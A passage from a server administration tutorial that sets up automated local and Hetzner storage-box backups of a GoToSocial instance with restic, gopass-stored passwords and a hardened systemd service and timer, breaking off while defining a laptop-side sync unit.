&lt;p&gt;We can now create our password store and passwords with gopass. We will perform local backups and use &lt;a href="https://www.hetzner.com/storage/storage-box/" rel="nofollow"&gt;Hetzner storage box&lt;/a&gt; for remote backups. We&amp;#39;ll only pick this provider for the sake of this guide, as our configuration can be easily tweaked for any other provider:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;# Run gopass initializer:&lt;/span&gt;
gopass setup &lt;span class="nt"&gt;--storage&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;fs

&lt;span class="c"&gt;# * Select the private key we created earlier.&lt;/span&gt;
&lt;span class="c"&gt;# * Don't add a git remote if asked.&lt;/span&gt;

&lt;span class="c"&gt;# Create a secret for borgmatic:&lt;/span&gt;
gopass create

&lt;span class="c"&gt;# * Choose '[ 0] Website login' (this actually works for any kind of password).&lt;/span&gt;
&lt;span class="c"&gt;# * Enter 'restic-local' in place of the website URL.&lt;/span&gt;
&lt;span class="c"&gt;# * Enter your username.&lt;/span&gt;
&lt;span class="c"&gt;# * Choose to generate a password: keep all default settings but pick ~64 characters or more.&lt;/span&gt;
&lt;span class="c"&gt;# * You may get a warning about not having a clipboard, like xclip: no need for it here, so nothing to worry about.&lt;/span&gt;
&lt;span class="c"&gt;# * Repeat this step once again with gopass create, and create a 'restic-hetzner' password.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code&gt;gopass -o restic-local&lt;/code&gt; and &lt;code&gt;gopass -o restic-hetzner&lt;/code&gt; should output your passwords now, which is what you&amp;#39;ll use in your restic scripts. Copy these passwords somewhere safe, outside of your VPS. Don&amp;#39;t lose them.&lt;/p&gt;

&lt;p&gt;Create the following scripts in your home directory:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;mkdir&lt;/span&gt; ~/backups
&lt;span class="nb"&gt;touch&lt;/span&gt; ~/backups/restic-local ~/backups/restic-hetzner
&lt;span class="nb"&gt;chmod&lt;/span&gt; +x ~/backups/restic-local ~/backups/restic-hetzner
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here&amp;#39;s what &lt;code&gt;restic-local&lt;/code&gt; will look like. Don&amp;#39;t forget to replace &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; accordingly:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;#!/usr/bin/env bash&lt;/span&gt;
&lt;span class="nb"&gt;set&lt;/span&gt; &lt;span class="nt"&gt;-euo&lt;/span&gt; pipefail
&lt;span class="nv"&gt;IFS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;$'&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;

&lt;span class="c"&gt;# Environment variables for local restic repository:&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;RESTIC_CACHE_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/root/.cache/restic"&lt;/span&gt;
&lt;span class="nv"&gt;RESTIC_REPOSITORY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/home/&amp;lt;username&amp;gt;/backups/&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;hostname&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;-vps-backup"&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;RESTIC_REPOSITORY
&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;RESTIC_PASSWORD_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"sudo -u &amp;lt;username&amp;gt; /home/&amp;lt;username&amp;gt;/go/bin/gopass -o websites/restic-local/&amp;lt;username&amp;gt;"&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$# &lt;/span&gt;&lt;span class="nt"&gt;-ne&lt;/span&gt; 0 &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then
    &lt;/span&gt;&lt;span class="nb"&gt;exec &lt;/span&gt;restic &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$@&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
    &lt;span class="nb"&gt;exit
&lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="c"&gt;# Directories and files to save:&lt;/span&gt;
&lt;span class="nv"&gt;PATHS&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;&lt;span class="s2"&gt;"/var/lib/gotosocial"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/systemd/system/gotosocial.service"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/caddy"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/systemd/system/caddy.service"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/fail2ban/jail.local"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/fail2ban/filter.d/gotosocial-4xx.conf"&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# Perform backups for directories and files:&lt;/span&gt;
&lt;span class="k"&gt;for &lt;/span&gt;path &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PATHS&lt;/span&gt;&lt;span class="p"&gt;[@]&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do
    &lt;/span&gt;restic backup &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$path&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="c"&gt;# Backup GoToSocial export:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; gotosocial gotosocial admin &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nt"&gt;--config-path&lt;/span&gt; /var/lib/gotosocial/.config/config.yaml &lt;span class="nt"&gt;--path&lt;/span&gt; /var/lib/gotosocial/export.json
restic backup /var/lib/gotosocial/export.json
&lt;span class="nb"&gt;rm&lt;/span&gt; /var/lib/gotosocial/export.json

&lt;span class="c"&gt;# Backup postgreSQL dump:&lt;/span&gt;
restic backup &lt;span class="nt"&gt;--stdin-filename&lt;/span&gt; postgres.dump &lt;span class="nt"&gt;--stdin-from-command&lt;/span&gt; &lt;span class="nt"&gt;--&lt;/span&gt; &lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; postgres pg_dumpall &lt;span class="nt"&gt;--clean&lt;/span&gt; &lt;span class="nt"&gt;--if-exists&lt;/span&gt;

&lt;span class="c"&gt;# Retention policy and cleanup:&lt;/span&gt;
restic forget &lt;span class="nt"&gt;--keep-daily&lt;/span&gt; 7 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-weekly&lt;/span&gt; 4 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-monthly&lt;/span&gt; 6 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-yearly&lt;/span&gt; 1 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--prune&lt;/span&gt;

&lt;span class="c"&gt;# Make a tar archive of your local restic repository,&lt;/span&gt;
&lt;span class="c"&gt;# owned by your main user:&lt;/span&gt;
&lt;span class="nb"&gt;tar &lt;/span&gt;czf /home/&amp;lt;username&amp;gt;/backups/&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;hostname&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nt"&gt;-vps-backup&lt;/span&gt;.tar.gz &lt;span class="nt"&gt;--directory&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/&amp;lt;username&amp;gt;/backups &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;hostname&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nt"&gt;-vps-backup&lt;/span&gt;
&lt;span class="nb"&gt;chown&lt;/span&gt; &amp;lt;username&amp;gt;:&amp;lt;username&amp;gt; /home/&amp;lt;username&amp;gt;/backups/&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;hostname&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nt"&gt;-vps-backup&lt;/span&gt;.tar.gz

&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_CACHE_DIR
&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_REPOSITORY
&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_PASSWORD_COMMAND
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We will come back to that &lt;code&gt;tar&lt;/code&gt; archive later on.&lt;/p&gt;

&lt;p&gt;Our &lt;code&gt;restic-hetzner&lt;/code&gt; script will be mostly similar, except we will need to fiddle with SSH and SFTP settings. Hetzner storage boxes enable password authentication for both protocols, and there is no way to disable it. To make this safer, change your storage box&amp;#39;s password on robot.hetzner.com to something unbelievably long and random, then add the password in &lt;code&gt;gopass&lt;/code&gt; by using &lt;code&gt;gopass create&lt;/code&gt; as shown earlier. Name that password &lt;code&gt;hetzner-storage-box&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then, let&amp;#39;s add a SSH config file for your current user with &lt;code&gt;touch ~/.ssh/config&lt;/code&gt; and add the following entry in it. Change the first two fields according to your storage box&amp;#39;s settings:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Host storagebox
  HostName &amp;lt;hostname as shown on robot.hetzner.com&amp;gt;
  User &amp;lt;username as shown on robot.hetzner.com&amp;gt;
  Port 23
  ServerAliveInterval 60
  ServerAliveCountMax 240
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You&amp;#39;ll also need to add a ufw rule for port 23: run &lt;code&gt;sudo ufw allow out 23 comment &amp;#39;Allow SFTP out (hetzner backups)&amp;#39;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Our &lt;code&gt;restic-hetzner&lt;/code&gt; script will make use of what you just configured and look like this. As before, replace &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; accordingly:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;#!/usr/bin/env bash&lt;/span&gt;
&lt;span class="nb"&gt;set&lt;/span&gt; &lt;span class="nt"&gt;-euo&lt;/span&gt; pipefail
&lt;span class="nv"&gt;IFS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;$'&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;

&lt;span class="c"&gt;# Environment variables for local restic repository:&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;RESTIC_CACHE_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/root/.cache/restic"&lt;/span&gt;
&lt;span class="nv"&gt;RESTIC_REPOSITORY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"sftp::/home/backups/&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;hostname&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;-vps-backup"&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;RESTIC_REPOSITORY
&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;RESTIC_PASSWORD_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"sudo -u &amp;lt;username&amp;gt; /home/&amp;lt;username&amp;gt;/go/bin/gopass -o websites/restic-hetzner/&amp;lt;username&amp;gt;"&lt;/span&gt;
&lt;span class="nv"&gt;SSHPASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; &amp;lt;username&amp;gt; /home/&amp;lt;username&amp;gt;/go/bin/gopass &lt;span class="nt"&gt;-o&lt;/span&gt; &lt;span class="s1"&gt;'websites/hetzner-storage-box/&amp;lt;username&amp;gt;'&lt;/span&gt;&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
&lt;span class="nb"&gt;export &lt;/span&gt;SSHPASS

&lt;span class="c"&gt;# Additional variable for sftp connection:&lt;/span&gt;
&lt;span class="nv"&gt;SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"sshpass -e ssh storagebox -p 23 -F /home/&amp;lt;username&amp;gt;/.ssh/config -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -s sftp"&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$# &lt;/span&gt;&lt;span class="nt"&gt;-ne&lt;/span&gt; 0 &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then
    &lt;/span&gt;&lt;span class="nb"&gt;exec &lt;/span&gt;restic &lt;span class="nt"&gt;-o&lt;/span&gt; sftp.command&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$@&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
    &lt;span class="nb"&gt;exit
&lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="c"&gt;# Directories and files to save:&lt;/span&gt;
&lt;span class="nv"&gt;PATHS&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;&lt;span class="s2"&gt;"/var/lib/gotosocial"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/systemd/system/gotosocial.service"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/caddy"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/systemd/system/caddy.service"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/fail2ban/jail.local"&lt;/span&gt; &lt;span class="s2"&gt;"/etc/fail2ban/filter.d/gotosocial-4xx.conf"&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# Perform backups for directories and files:&lt;/span&gt;
&lt;span class="k"&gt;for &lt;/span&gt;path &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PATHS&lt;/span&gt;&lt;span class="p"&gt;[@]&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do
    &lt;/span&gt;restic &lt;span class="nt"&gt;-o&lt;/span&gt; sftp.command&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; backup &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$path&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="c"&gt;# Backup GoToSocial export:&lt;/span&gt;
&lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; gotosocial gotosocial admin &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nt"&gt;--config-path&lt;/span&gt; /var/lib/gotosocial/.config/config.yaml &lt;span class="nt"&gt;--path&lt;/span&gt; /var/lib/gotosocial/export.json
restic &lt;span class="nt"&gt;-o&lt;/span&gt; sftp.command&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; backup /var/lib/gotosocial/export.json
&lt;span class="nb"&gt;rm&lt;/span&gt; /var/lib/gotosocial/export.json

&lt;span class="c"&gt;# Backup postgreSQL dump:&lt;/span&gt;
restic &lt;span class="nt"&gt;-o&lt;/span&gt; sftp.command&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; backup &lt;span class="nt"&gt;--stdin-filename&lt;/span&gt; postgres.dump &lt;span class="nt"&gt;--stdin-from-command&lt;/span&gt; &lt;span class="nt"&gt;--&lt;/span&gt; &lt;span class="nb"&gt;sudo&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; postgres pg_dumpall &lt;span class="nt"&gt;--clean&lt;/span&gt; &lt;span class="nt"&gt;--if-exists&lt;/span&gt;

&lt;span class="c"&gt;# Retention policy and cleanup:&lt;/span&gt;
restic &lt;span class="nt"&gt;-o&lt;/span&gt; sftp.command&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSHPASS_SFTP_COMMAND&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; forget &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-daily&lt;/span&gt; 7 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-weekly&lt;/span&gt; 4 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-monthly&lt;/span&gt; 6 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--keep-yearly&lt;/span&gt; 1 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--prune&lt;/span&gt;

&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_CACHE_DIR
&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_REPOSITORY
&lt;span class="nb"&gt;unset &lt;/span&gt;RESTIC_PASSWORD_COMMAND
&lt;span class="nb"&gt;unset &lt;/span&gt;SSHPASS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Make sure that the &lt;code&gt;/home/backups&lt;/code&gt; directory is present on your Hetzner storage box: create it with &lt;code&gt;mkdir /home/backups&lt;/code&gt; if needed.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re using another provider (Backblaze for instance), this script will be mostly similar except for its environment variables: take a look at &lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;, &lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;, and other env variables restic uses in their &lt;a href="https://restic.readthedocs.io/en/latest/040_backup.html#environment-variables" rel="nofollow"&gt;documentation&lt;/a&gt;. Chances are, it will be easier to set up than Hetzner&amp;#39;s SFTP transfers. Feel free to use &lt;code&gt;gopass&lt;/code&gt; like we did earlier for any additional credentials.&lt;/p&gt;

&lt;p&gt;If ran without any arguments, these scripts will take care of your backups and retention policy, but passing anything to them will simply forward commands to the local and remote repositories. Run &lt;code&gt;sudo ~/backups/restic-local init&lt;/code&gt; and &lt;code&gt;sudo ~/backups/restic-hetzner init&lt;/code&gt; to create them.&lt;/p&gt;

&lt;p&gt;You&amp;#39;re now ready to add these scripts to a systemd service and timer that will run as root. Create the following &lt;code&gt;/etc/systemd/system/restic.service&lt;/code&gt;, replacing &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; accordingly once more:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="nt"&gt;Description&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;restic backup
&lt;span class="nt"&gt;Wants&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network-online.target
&lt;span class="nt"&gt;After&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network-online.target

&lt;span class="k"&gt;[Service]&lt;/span&gt;
&lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;oneshot
&lt;span class="nt"&gt;RuntimeDirectory&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;restic
&lt;span class="nt"&gt;StateDirectory&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;restic
&lt;span class="nt"&gt;LockPersonality&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;true
&lt;span class="nt"&gt;MemoryDenyWriteExecute&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;no
&lt;span class="nt"&gt;NoNewPrivileges&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;PrivateTmp&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectClock&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectControlGroups&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectHostname&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectKernelLogs&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectKernelModules&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;ProtectKernelTunables&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;RestrictAddressFamilies&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;AF_UNIX AF_INET AF_INET6 AF_NETLINK
&lt;span class="nt"&gt;RestrictNamespaces&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;RestrictRealtime&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;RestrictSUIDSGID&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;yes
&lt;span class="nt"&gt;SystemCallArchitectures&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;native
&lt;span class="nt"&gt;SystemCallErrorNumber&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;EPERM
&lt;span class="nt"&gt;ProtectSystem&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;full

&lt;span class="c"&gt;# Lower CPU and I/O priority.&lt;/span&gt;
&lt;span class="nt"&gt;Nice&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;19
&lt;span class="nt"&gt;CPUSchedulingPolicy&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;batch
&lt;span class="nt"&gt;IOSchedulingClass&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;best-effort
&lt;span class="nt"&gt;IOSchedulingPriority&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;7
&lt;span class="nt"&gt;IOWeight&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;100

&lt;span class="nt"&gt;Restart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;no

&lt;span class="nt"&gt;ExecStartPre&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;systemd-inhibit --who="gotosocial-service-stop" --what="sleep:shutdown" --why="Prevent interrupting scheduled backup" /usr/bin/systemctl stop gotosocial

&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;systemd-inhibit --who="restic-local" --what="sleep:shutdown" --why="Prevent interrupting scheduled backup" /home/&amp;lt;username&amp;gt;/backups/restic-local

&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;systemd-inhibit --who="restic-hetzner" --what="sleep:shutdown" --why="Prevent interrupting scheduled backup" /home/&amp;lt;username&amp;gt;/backups/restic-hetzner

&lt;span class="nt"&gt;ExecStart&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;systemd-inhibit --who="gotosocial-service-start" --what="sleep:shutdown" --why="Prevent interrupting scheduled backup" /usr/bin/systemctl start gotosocial
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Create the following &lt;code&gt;/etc/systemd/system/restic.timer&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="nt"&gt;Description&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;Run restic backup

&lt;span class="k"&gt;[Timer]&lt;/span&gt;
&lt;span class="nt"&gt;OnCalendar&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;*-*-* 07:00:00
&lt;span class="nt"&gt;OnBootSec&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;10m
&lt;span class="nt"&gt;Persistent&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;true

&lt;span class="k"&gt;[Install]&lt;/span&gt;
&lt;span class="nt"&gt;WantedBy&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;timers.target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This will ensure your &lt;code&gt;restic.service&lt;/code&gt; runs every day at 07 AM, and also catches up any missed run if the VPS was ever powered off during that time. Run &lt;code&gt;systemd-analyze verify /etc/systemd/system/restic.*&lt;/code&gt; to make sure both service and timer files are valid (it returns nothing if everything is OK), and run &lt;code&gt;sudo systemctl start restic.timer &amp;amp;&amp;amp; sudo systemctl enable restic.timer&lt;/code&gt; to enable your service.&lt;/p&gt;

&lt;p&gt;We can check if everything is running smoothly or not with &lt;code&gt;sudo journalctl -u restic&lt;/code&gt;, and when the next backup is supposed to run with &lt;code&gt;sudo systemctl status restic.timer&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once your first backup is done, run &lt;code&gt;sudo ~/backups/restic-local snapshots&lt;/code&gt; and &lt;code&gt;sudo ~/backups/restic-hetzner snapshots&lt;/code&gt; to check if every path has been added to your repositories. The &lt;code&gt;check&lt;/code&gt; command is also useful to ensure nothing has been corrupted in your backups.&lt;/p&gt;

&lt;p&gt;Remember that tar archive we created at the end of our &lt;code&gt;restic-local&lt;/code&gt; script? This is because local backups would hardly be useful on their own, being stored in the exact same drive as the original data. Let&amp;#39;s save that archive on your actual computer and automate the process with another systemd service and timer.&lt;/p&gt;

&lt;p&gt;If you haven&amp;#39;t already, add an entry to your VPS in &lt;code&gt;~/.ssh/config&lt;/code&gt;, replacing &lt;code&gt;&amp;lt;my-vps&amp;gt;&lt;/code&gt; and all other fields to match your config:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Host &amp;lt;my-vps&amp;gt;
  HostName &amp;lt;VPS IP&amp;gt;
  User &amp;lt;username&amp;gt;
  Port &amp;lt;custom port number&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Create the following &lt;code&gt;~/.config/systemd/user/vps-backup.service&lt;/code&gt; on your laptop, dekstop, etc. Replace &lt;code&gt;&amp;lt;my-vps&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;hostname&amp;gt;&lt;/code&gt;, and &lt;code&gt;&amp;lt;path of your choosing&amp;gt;&lt;/code&gt; accordingly:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight systemd"&gt;&lt;code&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="nt"&gt;Description&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;VPS backup
&lt;span class="nt"&gt;Wants&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;network-online.target
